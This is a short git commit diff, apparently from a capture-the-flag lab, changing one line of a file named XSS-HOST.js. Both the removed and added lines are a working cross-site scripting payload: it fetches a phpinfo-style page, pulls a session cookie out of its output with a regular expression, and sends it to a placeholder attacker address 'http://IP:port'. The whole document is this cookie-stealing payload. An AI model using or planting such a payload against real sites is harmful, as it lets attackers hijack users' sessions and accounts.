84d629e639261f2d8462a4f0d9b55a0fdcc09b29
Sho07 <113521577+Sho2007@users.noreply.github.com>
2025-04-03 21:25:05 +0700

    Update XSS-HOST.js

--- XSS-HOST.js
+++ XSS-HOST.js
@@ -1,1 +1,1 @@
-fetch('/phpinfo.php') .then(response => response.text()) .then(text => { cookie = text.match(/dropctf_lab_session.{1,2000}/)[0]; fetch('http://IP:port/?cookie=' + encodeURIComponent(cookie)); });
+fetch('/info.php') .then(response => response.text()) .then(text => { cookie = text.match(/cookie_session.{1,2000}/)[0]; fetch('http://IP:port/?cookie=' + encodeURIComponent(cookie)); });
